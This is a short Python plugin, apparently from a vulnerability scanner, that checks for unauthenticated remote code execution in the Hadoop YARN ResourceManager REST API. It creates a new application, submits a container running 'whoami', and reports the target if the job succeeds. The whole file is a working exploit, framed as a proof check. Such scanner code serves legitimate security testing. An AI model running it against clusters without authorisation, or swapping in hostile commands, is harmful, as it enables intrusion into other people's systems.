#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

import json
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    hadoop yarn rce
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            url1 = self.base_url + "ws/v1/cluster/apps/new-application"
            url2 = self.base_url + "ws/v1/cluster/apps"
            async with ClientSession() as session:
                async with session.post(url=url1) as res:
                    if res != None :
                        text = str(await res.text())
                        try:
                            app_id = json.loads(text).get("application-id", "")
                        except:
                            pass
                        else:
                            payload = {
                                'application-id': app_id,
                                'application-name': 'mytest',
                                'am-container-spec': {
                                    'commands': {
                                        'command': 'whoami',
                                    },
                                },
                                'application-type': 'YARN',
                            }
                            async with session.post(url=url2, json=payload) as res:
                                if res != None and res.status == 202 and 'Location' in res.headers.keys():
                                    url3 = res.headers['Location']
                                    async with session.get(url=url3) as res:
                                        if res != None:
                                            text = str(await res.text())
                                            if 'finalStatus' in text and 'FAILED' not in text:
                                                yield url1